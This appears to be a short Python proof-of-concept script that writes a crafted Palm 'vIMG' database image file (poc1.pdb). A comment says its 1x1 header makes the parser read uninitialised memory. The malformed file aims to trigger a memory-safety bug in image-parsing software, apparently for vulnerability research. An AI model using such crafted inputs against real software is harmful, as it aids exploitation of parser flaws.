from pathlib import Path
import struct
p=bytearray()

p += struct.pack('>H',0) # pdb db version
p += struct.pack('>IIIIII',0,0,0,0,0,0)
p += b'vIMG'
p += b'View'
p += struct.pack('>I',0) # seed
p += struct.pack('>I',0) # next_record
p += struct.pack('>H',1) # number records
p += struct.pack('>I',86)
p += b'\x40\x6f\x80'
p += b'\x00'
# image header
p += b'img'.ljust(32,b'\0')
p += b'\x00' # version no compression
p += b'\x00' # type 2bit
p += struct.pack('>IIHHIHHHH',0,0,0,0,0,0,0,1,1) # width=1 height=1
p += b'\x00' # one packet? packets calculation 2*1/8*1=0, so no pixel read maybe uninit read p[0] from allocated 256 uninit
Path('poc1.pdb').write_bytes(p)
print(len(p))
